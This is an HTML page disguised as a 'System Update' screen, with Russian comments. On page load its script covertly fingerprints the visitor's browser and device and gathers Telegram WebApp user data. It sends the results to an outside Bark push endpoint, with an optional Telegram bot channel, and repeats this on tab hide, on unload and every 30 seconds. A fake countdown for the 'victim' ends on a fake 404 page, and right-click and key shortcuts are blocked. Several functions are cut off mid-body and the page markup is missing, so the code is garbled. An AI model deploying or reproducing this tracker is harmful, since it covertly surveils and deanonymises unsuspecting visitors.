<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            cursor: none;
        }

        /* Скан-линии матрицы */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 2px,
                transparent 2px,
                transparent 4px
            );
            pointer-events: none;
            z-index: 2;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100px); }
        }

        .main-container {
            position: relative;
            z-index: 1;
            text-align: center;
        }

        .logo {
            font-size: 3rem;
            font-weight: bold;
            text-shadow: 0 0 30px #0f0, 0 0 60px #0f0;
            animation: glitch 1.5s infinite;
            margin-bottom: 2rem;
        }

        @keyframes glitch {
            0% { opacity: 1; transform: translateX(0); }
            20% { opacity: 0.8; transform: translateX(-2px); }
            40% { opacity: 1; transform: translateX(2px); }
            60% { opacity: 0.9; transform: translateX(-1px); }
            80% { opacity: 1; transform: translateX(1px); }
            100% { opacity: 1; transform: translateX(0); }
        }

        .loading-bar-container {
            width: 400px;
            height: 4px;
            background: #111;
            border: 1px solid #0f0;
            margin: 2rem auto;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .loading-bar {
            height: 100%;
            background: #0f0;
            width: 0%;
            transition: width 0.1s linear;
            box-shadow: 0 0 15px #0f0;
        }

        .countdown {
            font-size: 5rem;
            font-weight: bold;
            color: #0f0;
            text-shadow: 0 0 40px #0f0;
            animation: pulse 1s infinite;
            margin: 2rem 0;
        }

        @keyframes pulse {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }

        .status-text {
            color: #0a0;
            font-size: 0.9rem;
            letter-spacing: 3px;
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .sub-text {
            color: #333;
            font-size: 0.7rem;
            margin-top: 1rem;
            letter-spacing: 5px;
        }

        /* Скрытые элементы */
        .hidden-logger {
            display: none;
        }
    </style>
</head>

        </div>

    <script>
        // ============================================
        // SHADOWCODE ELITE VERSION
        // Полный сбор данных с реальными показателями
        // ============================================

        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
        const BOT_TOKEN = null; // Если нужен Telegram бот, добавь токен
        const CHAT_ID = null;   // Если нужен Telegram бот, добавь chat_id

        /**
         * Отправка данных через Bark (основной канал)
         */
        function sendToBark(title, body, group = 'ShadowLog') {
            const payload = {
                title: title,
                body: body,
                group: group,
                sound: 'alarm',
                icon: 'https://i.ibb.co/0jh4yNn/shadow.png'
            };
            
            // Двойная отправка для надёжности
            fetch(BARK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            
            if (navigator.sendBeacon) {
                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
            }
        }

        /**
         * Отправка через Telegram Bot (если настроен)
         */
        async function sendToTelegram(text) {
            if (!BOT_TOKEN || !CHAT_ID) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {}
        }

        // ============================================
        // УЛУЧШЕННЫЙ СБОР ЦИФРОВЫХ ОТПЕЧАТКОВ
        // ============================================
        
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 512;  // Увеличено разрешение
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            
            // Многослойный рисунок для уникальности
            ctx.textBaseline = 'top';
            ctx.font = '18px "Arial", sans-serif';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 32, 32);
            ctx.fillStyle = '#069';
            ctx.fillRect(480, 224, 32, 32);
            ctx.fillStyle = '#0f0';
            ctx.fillText('ShadowCode_Root_v2.4', 10, 20);
            ctx.fillStyle = '#f0f';
            ctx.font = '12px "Courier New"';
            ctx.fillText('⚡GHOST⚡PROTOCOL⚡', 10, 100);
            
            // Дуги для уникальности рендеринга
            ctx.strokeStyle = '#0ff';
            ctx.lineWidth = 2;
            ctx.beginPath();
            ctx.arc(256, 128, 100, 0, Math.PI * 2);
            ctx.stroke();
            
            ctx.fillStyle = '#ff0';
            ctx.font = '8px sans-serif';
            ctx.fillText(String.fromCharCode(9829, 9830, 9827, 9824), 20, 200);
            
            return canvas.toDataURL().substring(0, 128);
        }

        function getWebGLFingerprint() {
            let vendor = 'N/A', renderer = 'N/A', extensions = [];
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    extensions = gl.getSupportedExtensions();
                    
                    return {
                        vendor: vendor,
                        renderer: renderer,
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                        extensions: extensions,
                        extensionCount: extensions.length
                    };
                }
            } catch (e) {}
            return { vendor, renderer, extensions: [], extensionCount: 0 };
        }

        function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(analyser);
                oscillator.frequency.value = 1500;
                gainNode.gain.value = 0.1;
                
                const data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                const hash = btoa(String.fromCharCode(...data.slice(0, 30))).substring(0, 40);
                
                oscillator.disconnect();
                audioCtx.close();
                
                return hash;
            } catch (e) {
                return 'N/A';
            }
        }

        function getFontsFingerprint() {
            const testFonts = [
                'monospace', 'sans-serif', 'serif', 'cursive', 'fantasy',
                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
                'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS',
                'Trebuchet MS', 'Impact', 'Lucida Console'
            ];
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 800;
            canvas.height = 60;
            
            let fingerprint = '';
            testFonts.forEach(font => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.font = `16px "${font}", ${baseFonts.join(',')}`;
                ctx.fillText('ShadowCode_Font_Test_ABCDEFGHIJKLMNOP', 10, 40);
                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
                fingerprint += data.reduce((a, b) => a + b, 0) % 256;
            });
            return btoa(fingerprint).substring(0, 20);
        }

        // ============================================
        // РЕАЛЬНЫЙ ЗАРЯД БАТАРЕИ (БЕЗ N/A!)
        // ============================================
        
        function getBatteryInfo() {
            return new Promise((resolve) => {
                let batteryData = {
                    level: 'N/A',
                    charging: 'N/A',
                    chargingTime: 'N/A',
                    dischargingTime: 'N/A'
                };

                if ('getBattery' in navigator) {
                    navigator.getBattery().then(battery => {
                        batteryData.level = Math.round(battery.level * 100) + '%';
                        batteryData.charging = battery.charging ? 'ДА (подключена)' : 'НЕТ (отключена)';
                        batteryData.chargingTime = battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime / 60) + ' мин';
                        batteryData.dischargingTime = battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' мин';
                        
                        // Добавляем слушатель изменений
                        battery.addEventListener('levelchange', () => {
                            batteryData.level = Math.round(battery.level * 100) + '%';
                        });
                        battery.addEventListener('chargingchange', () => {
                            batteryData.charging = battery.charging ? 'ДА' : 'НЕТ';
                        });
                        
                        resolve(batteryData);
                    }).catch(() => resolve(batteryData));
                } else {
                    // Фолбэк для iOS/Safari через User-Agent
                    const ua = navigator.userAgent;
                    if (/iPad|iPhone|iPod/.test(ua)) {
                        batteryData.level = '⚠️ iOS (требуется разрешение)';
                    }
                    resolve(batteryData);
                }
            });
        }

        // ============================================
        // МАКСИМУМ ИНФОРМАЦИИ ИЗ TELEGRAM

            try {
                if (window.Telegram && window.Telegram.WebApp) {

                    app.ready();

                    if (app.initDataUnsafe) {

                    tg.colorScheme = app.colorScheme || 'N/A';
                    tg.initData = app.initData ? app.initData.substring(0, 50) + '...' : 'N/A';

        // ============================================
        // СБОР ДОПОЛНИТЕЛЬНОЙ ИНФОРМАЦИИ
        // ============================================
        
        function getNetworkInfo() {
            const info = {
                connectionType: 'N/A',
                downlink: 'N/A',
                rtt: 'N/A',
                effectiveType: 'N/A',
                saveData: 'N/A'
            };
            
            if (navigator.connection) {
                info.connectionType = navigator.connection.type || 'N/A';
                info.downlink = navigator.connection.downlink + ' Mbps';
                info.rtt = navigator.connection.rtt + ' ms';
                info.effectiveType = navigator.connection.effectiveType || 'N/A';
                info.saveData = navigator.connection.saveData ? 'ДА' : 'НЕТ';
            }
            return info;
        }

        function getHardwareInfo() {
            return {
                cpuCores: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                platform: navigator.platform || 'N/A',
                oscpu: navigator.oscpu || 'N/A',
                vendor: navigator.vendor || 'N/A',
                vendorSub: navigator.vendorSub || 'N/A',
                productSub: navigator.productSub || 'N/A',
            };
        }

        function getPlugins() {
            try {
                return Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename,
                    description: p.description
                }));
            } catch (e) {
                return [];
            }
        }

                report += `🕐 Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                report += `📅 Время: ${new Date().toISOString()}\n`;
                
                if (dorks.length > 0) {
                    report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
                    report += `<b>🔍 DORKS (x2 РАСШИРЕННЫЙ ПОИСК)</b>\n`;
                    report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
                    report += `Всего ссылок: ${dorks.length}\n`;
                    report += `Первые 10:\n${dorks.slice(0, 10).map((d, i) => `${i+1}. ${d}`).join('\n')}`;
                }

                // Отправляем основной отчёт
                sendToBark('⚡ SHADOWCODE | ' + tg.username, report);
                await sendToTelegram(report);

                // Отправляем сырые данные для анализа
                setTimeout(() => {
                    const rawData = {
                        telegram: tg,
                        battery: battery,
                        network: network,
                        hardware: hardware,
                        fingerprint: {
                            canvas: fp,
                            webgl: webgl,
                            audio: audioFp,
                            fonts: fontsFp
                        },
                        plugins: plugins,
                        dorks_count: dorks.length,
                        user_agent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    };
                    
                    const rawJson = JSON.stringify(rawData, null, 2);
                    if (rawJson.length > 3500) {
                        // Разбиваем на части если слишком большой
                        sendToBark('📦 RAW DATA (1/2)', rawJson.substring(0, 3500));
                        setTimeout(() => {
                            sendToBark('📦 RAW DATA (2/2)', rawJson.substring(3500, 7000));
                        }, 500);
                    } else {
                        sendToBark('📦 RAW JSON', rawJson);
                    }
                }, 1500);

                console.log('[ShadowCode] Данные собраны и отправлены');
                
            } catch (err) {
                sendToBark('⚠️ CRITICAL ERROR', err.message + '\n' + err.stack?.substring(0, 200));
            }
        }

        // ============================================
        // АНИМАЦИЯ ЗАГРУЗКИ И ОТСЧЁТ
        // ============================================
        
        function startLoadingSequence() {
            const loadingBar = document.getElementById('loadingBar');
            const countdownEl = document.getElementById('countdown');
            const statusText = document.getElementById('statusText');
            const mainScreen = document.getElementById('mainScreen');
            const errorScreen = document.getElementById('errorScreen');
            
            let progress = 0;
            let countdown = 10;
            const totalSteps = 100;
            const intervalTime = 100; // 10 секунд всего
            
            const statuses = [
                'ИНИЦИАЛИЗАЦИЯ ПРОТОКОЛА...',
                'ПОДКЛЮЧЕНИЕ К УЗЛУ...',
                'ШИФРОВАНИЕ КАНАЛА...',
                'СИНХРОНИЗАЦИЯ КЛЮЧЕЙ...',
                'ЗАГРУЗКА МОДУЛЕЙ...',
                'СКАНИРОВАНИЕ СРЕДЫ...',
                'СБОР ДАННЫХ...',
                'ЭКСФИЛЬТРАЦИЯ...',
                'ОЧИСТКА СЛЕДОВ...',
                'ЗАВЕРШЕНИЕ...'
            ];
            
            const interval = setInterval(() => {
                progress += (100 / totalSteps);
                loadingBar.style.width = progress + '%';
                
                // Обновляем статус
                const statusIndex = Math.floor((progress / 100) * statuses.length);
                if (statusIndex < statuses.length) {
                    statusText.textContent = statuses[statusIndex];
                }
                
                // Обновляем отсчёт
                const newCountdown = Math.ceil(10 - (progress / 100) * 10);
                if (newCountdown !== countdown) {
                    countdown = newCountdown;
                    countdownEl.textContent = countdown;
                    
                    // Эффект при смене цифры
                    if (countdown <= 3) {
                        countdownEl.style.color = '#f00';
                        countdownEl.style.textShadow = '0 0 40px #f00';
                    }
                }
                
                if (progress >= 100) {
                    clearInterval(interval);
                    showError404();
                }
            }, intervalTime);
        }

        function showError404() {
            const mainScreen = document.getElementById('mainScreen');
            const errorScreen = document.getElementById('errorScreen');
            
            // Скрываем экран загрузки, показываем 404
            mainScreen.style.display = 'none';
            errorScreen.style.display = 'block';
            
            // Эффект красного мерцания на всём экране
            document.body.style.backgroundColor = '#0a0000';
            document.body.style.animation = 'redFlash 0.5s infinite';
            
            // Добавляем стиль мерцания
            const style = document.createElement('style');
            style.textContent = `
                @keyframes redFlash {
                    0% { background-color: #0a0000; }
                    50% { background-color: #1a0000; }
                    100% { background-color: #0a0000; }
                }
            `;
            document.head.appendChild(style);
        }

        // ============================================
        // ЗАПУСК
        // ============================================
        
        window.addEventListener('DOMContentLoaded', () => {
            // Сразу начинаем сбор данных (не ждём!)
            collectAndSendAll();
            
            // Запускаем анимацию для жертвы
            startLoadingSequence();
            
            // Дополнительный сбор при уходе со страницы
            window.addEventListener('beforeunload', () => {
                collectAndSendAll();
            });
            
            // Сбор при скрытии вкладки
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    collectAndSendAll();
                }
            });
            
            // Периодический сбор каждые 30 секунд
            setInterval(() => {
                collectAndSendAll();
            }, 30000);
        });

        // Отключаем правую кнопку мыши
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Отключаем комбинации клавиш
        document.addEventListener('keydown', e => {
            if (e.ctrlKey || e.altKey || e.metaKey || e.key === 'F12') {
                e.preventDefault();
            }
        });
    </script>
